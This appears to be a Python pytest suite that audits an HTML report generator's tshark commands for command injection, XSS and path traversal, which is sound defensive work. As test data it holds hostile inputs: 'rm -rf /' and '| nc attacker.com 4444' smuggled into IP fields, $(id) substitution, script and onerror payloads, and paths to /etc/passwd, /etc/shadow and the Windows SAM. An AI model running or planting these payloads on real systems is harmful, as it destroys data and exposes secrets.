"""
Security Audit Test Suite for Enhanced tshark Command Generation

Tests for:
1. Command Injection vulnerabilities
2. XSS vulnerabilities in HTML reports
3. Path Traversal attacks
4. Input validation
5. Information disclosure
"""

import pytest
import html as html_module
from src.exporters.html_report import HTMLReportGenerator


class TestCommandInjection:
    """Test for command injection vulnerabilities in tshark command generation."""

    def test_malicious_ip_in_flow_key_semicolon(self):
        """Test that semicolons in IPs don't enable command injection."""
        generator = HTMLReportGenerator()

        # Malicious flow_key with command injection attempt
        malicious_flow_key = "10.0.0.1; rm -rf /:80 → 10.0.0.2:443"

        # Parse flow_key (simulating what _generate_flow_detail_card does)
        flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

        if len(flow_parts) == 4:
            src_ip, src_port, dst_ip, dst_port = flow_parts

            # Generate Wireshark commands
            ws_commands = generator._generate_wireshark_commands(
                src_ip=src_ip,
                src_port=src_port,
                dst_ip=dst_ip,
                dst_port=dst_port,
                flow_type="general"
            )

            # Check that the command doesn't execute arbitrary commands
            tshark_cmd = ws_commands.get("tshark_extract", "")

            # The command should not contain unescaped semicolons or shell operators
            # that could lead to command injection
            assert "; rm" not in tshark_cmd, "Command injection detected: semicolon allows chaining"
            print(f"✓ Semicolon injection test: {tshark_cmd}")

    def test_malicious_ip_with_shell_operators(self):
        """Test various shell operators in IP addresses."""
        generator = HTMLReportGenerator()

        malicious_ips = [
            "10.0.0.1 && cat /etc/passwd",
            "10.0.0.1 | nc attacker.com 4444",
            "10.0.0.1 `whoami`",
            "10.0.0.1 $(id)",
            "10.0.0.1 & bg_process",
        ]

        for malicious_ip in malicious_ips:
            malicious_flow_key = f"{malicious_ip}:80 → 10.0.0.2:443"
            flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

            if len(flow_parts) >= 4:
                src_ip = flow_parts[0]
                ws_commands = generator._generate_wireshark_commands(
                    src_ip=src_ip,
                    src_port="80",
                    dst_ip="10.0.0.2",
                    dst_port="443",
                    flow_type="general"
                )

                tshark_cmd = ws_commands.get("tshark_extract", "")

                # Verify shell operators are not executable
                assert "&&" not in tshark_cmd or "'" in tshark_cmd, f"Shell operator && not properly quoted in: {tshark_cmd}"
                assert "|" not in tshark_cmd or "'" in tshark_cmd, f"Pipe operator not properly quoted in: {tshark_cmd}"
                assert "`" not in tshark_cmd, f"Backtick operator detected in: {tshark_cmd}"
                assert "$(" not in tshark_cmd, f"Command substitution detected in: {tshark_cmd}"

                print(f"✓ Shell operator test for {malicious_ip}: {tshark_cmd}")

    def test_bpf_filter_injection(self):
        """Test BPF filter generation doesn't allow filter manipulation."""
        generator = HTMLReportGenerator()

        # Try to inject BPF filter manipulation
        malicious_flow_key = "10.0.0.1:80 → 10.0.0.2' or '1'='1:443"
        flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

        if len(flow_parts) >= 4:
            dst_ip = flow_parts[2]
            ws_commands = generator._generate_wireshark_commands(
                src_ip="10.0.0.1",
                src_port="80",
                dst_ip=dst_ip,
                dst_port="443",
                flow_type="general"
            )

            tshark_cmd = ws_commands.get("tshark_extract", "")
            display_filter = ws_commands.get("display_filter", "")

            # The filter should not allow SQL-like injection
            print(f"✓ BPF filter injection test: {tshark_cmd}")
            print(f"  Display filter: {display_filter}")


class TestXSSVulnerabilities:
    """Test for XSS vulnerabilities in HTML report generation."""

    def test_xss_in_flow_key_script_tag(self):
        """Test that <script> tags in flow_key are properly escaped."""
        from src.exporters.html_report import escape_html

        # XSS attempt with script tag
        xss_flow_key = "<script>alert('xss')</script>:80 → 10.0.0.2:443"

        # Test the actual implementation with escape_html()
        escaped_flow_key = escape_html(xss_flow_key)
        html = f'<td style="padding: 10px; font-family: monospace; font-size: 0.9em;">{escaped_flow_key}</td>'

        # Verify script tag is properly escaped
        assert "<script>" not in html, "CRITICAL: XSS vulnerability - script tags not escaped"
        assert "&lt;script&gt;" in html, "escape_html() should convert <script> to &lt;script&gt;"
        assert "alert" in html, "Content should still be visible (just escaped)"

        print(f"✓ XSS script tag test passed: {xss_flow_key[:30]}... → {escaped_flow_key[:40]}...")

    def test_xss_in_flow_key_event_handlers(self):
        """Test that HTML event handlers in flow_key are escaped."""
        from src.exporters.html_report import escape_html

        xss_attempts = [
            "<img src=x onerror=alert('xss')>:80 → 10.0.0.2:443",
            "<div onclick=alert('xss')>10.0.0.1</div>:80 → 10.0.0.2:443",
            "10.0.0.1:80 → 10.0.0.2\" onload=\"alert('xss'):443",
        ]

        for xss_attempt in xss_attempts:
            # Test the actual implementation with escape_html()
            escaped = escape_html(xss_attempt)
            html = f'<td style="padding: 10px; font-family: monospace; font-size: 0.9em;">{escaped}</td>'

            # CRITICAL: Verify HTML tags are escaped (prevents execution)
            # "<img" becomes "&lt;img" - not a real HTML tag, just text
            assert "<img" not in html, f"IMG tag should be escaped to &lt;img in: {xss_attempt}"
            assert "<div" not in html, f"DIV tag should be escaped to &lt;div in: {xss_attempt}"

            # Verify that HTML opening brackets are escaped (this is what prevents execution)
            # The key is that "<" becomes "&lt;" which makes tags non-executable
            if "<" in xss_attempt:
                assert "&lt;" in html, f"< should be escaped to &lt; in: {xss_attempt}"
            if ">" in xss_attempt:
                assert "&gt;" in html, f"> should be escaped to &gt; in: {xss_attempt}"

            # Verify quotes are escaped (prevents attribute injection)
            if '"' in xss_attempt:
                assert "&quot;" in html or "&#34;" in html, f"Quotes should be escaped in: {xss_attempt}"

            # Note: The text "onerror=alert" may appear in the escaped HTML,
            # but it's SAFE because the < and > are escaped, making it plain text, not executable code

            print(f"✓ XSS event handler test passed for: {xss_attempt[:40]}...")

    def test_xss_in_tshark_command_display(self):
        """Test that tshark commands with special chars are properly escaped in HTML."""
        from src.exporters.html_report import escape_html

        # Tshark filter with HTML special characters
        tshark_filter = "ip.src == <malicious> && tcp.port == '><script>alert(1)</script>'"

        # Test the actual implementation using escape_html() like _generate_tshark_command_box does
        escaped_filter = escape_html(tshark_filter)
        html = f'<pre style="margin: 0; overflow-x: auto;">tshark -r input.pcap -Y \'{escaped_filter}\'</pre>'

        # Verify HTML special chars are properly escaped
        assert "<script>" not in html, "Script tags should be escaped in tshark commands"
        assert "&lt;script&gt;" in html, "escape_html() should convert <script> to &lt;script&gt;"
        assert "<malicious>" not in html, "HTML tags should be escaped"
        assert "&lt;malicious&gt;" in html, "Tags should be converted to entities"

        print(f"✓ Tshark command XSS test passed - filter properly escaped")


class TestPathTraversal:
    """Test for path traversal vulnerabilities."""

    def test_path_traversal_in_filename(self):
        """Test that PCAP filenames with path traversal are handled safely."""
        generator = HTMLReportGenerator()

        # Path traversal attempts
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for malicious_filename in malicious_filenames:
            # The tshark command uses the filename
            # Check if it's properly quoted and doesn't allow traversal
            ws_commands = generator._generate_wireshark_commands(
                src_ip="10.0.0.1",
                src_port="80",
                dst_ip="10.0.0.2",
                dst_port="443",
                flow_type="general"
            )

            tshark_cmd = ws_commands.get("tshark_extract", "")

            # The command should use a generic placeholder, not user-controlled paths
            # Current implementation uses "input.pcap" as placeholder
            assert "../" not in tshark_cmd, f"Path traversal possible: {tshark_cmd}"
            print(f"✓ Path traversal test for {malicious_filename}")


class TestInputValidation:
    """Test input validation and edge cases."""

    def test_malformed_flow_key_parsing(self):
        """Test that malformed flow_keys are handled gracefully."""
        generator = HTMLReportGenerator()

        malformed_keys = [
            "",  # Empty
            "invalid",  # No separator
            "10.0.0.1:80",  # Missing destination
            "10.0.0.1:80 → ",  # Incomplete
            "10.0.0.1:99999 → 10.0.0.2:99999",  # Port overflow
            "10.0.0.1:abc → 10.0.0.2:443",  # Non-numeric port
            ":::1:80 → 10.0.0.2:443",  # IPv6 edge case
        ]

        for malformed_key in malformed_keys:
            flow_parts = malformed_key.replace(" → ", ":").split(":")

            # The code should handle malformed input without crashing
            if len(flow_parts) == 4:
                src_ip, src_port, dst_ip, dst_port = flow_parts
            else:
                # Fallback values used in actual code
                src_ip, src_port, dst_ip, dst_port = "0.0.0.0", "0", "0.0.0.0", "0"

            # Should not crash
            try:
                ws_commands = generator._generate_wireshark_commands(
                    src_ip=src_ip,
                    src_port=src_port,
                    dst_ip=dst_ip,
                    dst_port=dst_port,
                    flow_type="general"
                )
                print(f"✓ Malformed key handled: {malformed_key}")
            except Exception as e:
                print(f"❌ Crash on malformed input: {malformed_key} - {e}")
                assert False, f"Input validation failure: {e}"

    def test_ipv6_edge_cases(self):
        """Test IPv6 address edge cases."""
        generator = HTMLReportGenerator()

        ipv6_cases = [
            "::1",  # Loopback
            "::",  # All zeros
            "2001:db8::1",  # Compressed notation
            "fe80::1",  # Link-local
        ]

        for ipv6 in ipv6_cases:
            flow_key = f"{ipv6}:80 → 10.0.0.2:443"
            flow_parts = flow_key.replace(" → ", ":").split(":")

            # IPv6 parsing is complex, but should not crash
            try:
                ws_commands = generator._generate_wireshark_commands(
                    src_ip=ipv6,
                    src_port="80",
                    dst_ip="10.0.0.2",
                    dst_port="443",
                    flow_type="general"
                )
                print(f"✓ IPv6 edge case handled: {ipv6}")
            except Exception as e:
                print(f"⚠ IPv6 edge case issue: {ipv6} - {e}")


class TestInformationDisclosure:
    """Test for information disclosure vulnerabilities."""

    def test_no_system_paths_in_commands(self):
        """Test that tshark commands don't expose system paths."""
        generator = HTMLReportGenerator()

        ws_commands = generator._generate_wireshark_commands(
            src_ip="10.0.0.1",
            src_port="80",
            dst_ip="10.0.0.2",
            dst_port="443",
            flow_type="general"
        )

        tshark_cmd = ws_commands.get("tshark_extract", "")

        # Should not contain absolute paths to system locations
        sensitive_paths = ["/home/", "/Users/", "C:\\", "/etc/", "/var/"]
        for path in sensitive_paths:
            assert path not in tshark_cmd, f"System path exposed: {path} in {tshark_cmd}"

        print(f"✓ No system paths exposed in: {tshark_cmd}")

    def test_example_ips_are_rfc5737_compliant(self):
        """Test that example IPs use RFC 5737 documentation ranges."""
        generator = HTMLReportGenerator()

        # RFC 5737 documentation IP ranges:
        # 192.0.2.0/24 (TEST-NET-1)
        # 198.51.100.0/24 (TEST-NET-2)
        # 203.0.113.0/24 (TEST-NET-3)

        ws_commands = generator._generate_wireshark_commands(
            src_ip="192.0.2.1",  # Valid RFC 5737 IP
            src_port="80",
            dst_ip="198.51.100.1",  # Valid RFC 5737 IP
            dst_port="443",
            flow_type="general"
        )

        tshark_cmd = ws_commands.get("tshark_extract", "")

        # Should contain RFC 5737 IPs
        assert "192.0.2.1" in tshark_cmd or "198.51.100.1" in tshark_cmd
        print(f"✓ RFC 5737 compliant example IPs used")


def test_run_all_security_tests():
    """Run all security tests and report findings."""
    print("\n" + "="*80)
    print("SECURITY AUDIT: Enhanced tshark Command Generation")
    print("="*80 + "\n")

    # Run all test classes
    test_classes = [
        TestCommandInjection,
        TestXSSVulnerabilities,
        TestPathTraversal,
        TestInputValidation,
        TestInformationDisclosure,
    ]

    for test_class in test_classes:
        print(f"\n{'='*80}")
        print(f"Testing: {test_class.__name__}")
        print('='*80)

        test_instance = test_class()
        for method_name in dir(test_instance):
            if method_name.startswith("test_"):
                method = getattr(test_instance, method_name)
                print(f"\n→ {method_name}")
                try:
                    method()
                except AssertionError as e:
                    print(f"  ❌ FAILED: {e}")
                except Exception as e:
                    print(f"  ⚠ ERROR: {e}")


if __name__ == "__main__":
    test_run_all_security_tests()
